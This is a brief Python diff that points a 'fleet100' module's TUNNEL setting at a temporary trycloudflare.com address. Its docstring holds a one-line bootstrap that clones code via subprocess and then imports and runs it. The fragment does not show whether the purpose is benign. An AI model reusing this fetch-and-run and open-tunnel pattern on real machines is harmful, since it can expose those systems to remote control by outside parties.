@@ -3,7 +3,7 @@ import subprocess,sys; subprocess.run([...clone...]); import fleet100; fleet100.
 """
 import threading, time, subprocess, sys
 
-TUNNEL = None
+TUNNEL = 'https://jungle-conservation-alan-characteristic.trycloudflare.com'
 
 
 def _reclone():
